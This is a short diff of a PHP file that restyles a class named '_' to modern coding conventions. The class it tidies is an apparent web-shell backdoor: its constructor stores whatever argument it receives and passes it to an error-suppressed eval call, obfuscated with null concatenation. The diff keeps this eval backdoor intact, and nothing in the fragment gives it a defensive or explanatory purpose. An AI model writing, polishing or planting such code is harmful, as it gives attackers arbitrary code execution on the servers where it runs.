@@ -2,8 +2,8 @@
 
 class _
 {
-    static public $php = Null;
-    function __construct($l = "error")
+    public static $php = null;
+    public function __construct($l = "error")
     {
         self::$php = $l;
         @eval(null . null . self::$php);
